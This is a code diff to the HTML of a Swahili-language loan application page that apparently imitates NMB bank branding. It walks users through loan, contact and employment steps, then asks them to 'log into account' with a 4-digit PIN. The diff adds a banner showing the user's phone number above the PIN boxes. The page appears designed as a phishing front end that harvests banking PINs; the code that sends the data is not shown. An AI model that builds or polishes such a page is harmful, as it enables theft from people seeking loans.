@@ -1,4 +1,3 @@
-<!-- public/index.html -->
 <!DOCTYPE html>
 <html lang="sw">
 <head>
@@ -44,7 +43,7 @@
                 <button type="button" class="btn-primary" onclick="goToStep('step-details')">OMBA SASA</button>
             </div>
 
-            <!-- Step 2: Loan Details Form (Hatua 1 ya 3) -->
+            <!-- Step 2: Loan Details Form -->
             <div id="step-details" class="form-step">
                 <h2>Maombi ya Mkopo</h2>
                 <p class="step-indicator">Hatua 1 ya 3</p>
@@ -73,7 +72,7 @@
                 </div>
             </div>
 
-            <!-- Step 3: Contact & Name Info (Hatua 2 ya 3) -->
+            <!-- Step 3: Contact & Name Info -->
             <div id="step-contact" class="form-step">
                 <h2>Maombi ya Mkopo</h2>
                 <p class="step-indicator">Hatua 2 ya 3</p>
@@ -102,7 +101,7 @@
                 </div>
             </div>
 
-            <!-- Step 4: Employment & Summary (Hatua 3 ya 3) -->
+            <!-- Step 4: Employment & Summary -->
             <div id="step-summary" class="form-step">
                 <h2>Maombi ya Mkopo</h2>
                 <p class="step-indicator">Hatua 3 ya 3</p>
@@ -130,10 +129,12 @@
                 </div>
             </div>
 
-            <!-- Step 5: PIN Entry -->
+            <!-- Step 5: PIN Entry with Phone Display on Top -->
             <div id="step-pin" class="form-step">
                 <h2>Ingia Akaunti</h2>
+                <div class="phone-display-banner" style="text-align: center; font-weight: bold; color: var(--nmb-blue); font-size: 1.1rem; margin-bottom: 5px;" id="displayPhoneNumber">+255 7XXXXXXXX</div>
                 <p class="subtitle">Weka PIN yako (tarakimu 4)</p>
+                
                 <div class="pin-inputs">
                     <input type="password" maxlength="1" class="pin-box" autofocus>
                     <input type="password" maxlength="1" class="pin-box">
@@ -179,4 +180,5 @@
     </div>
     <script src="script.js"></script>
 </body>
-</html>
+    </html>
+    
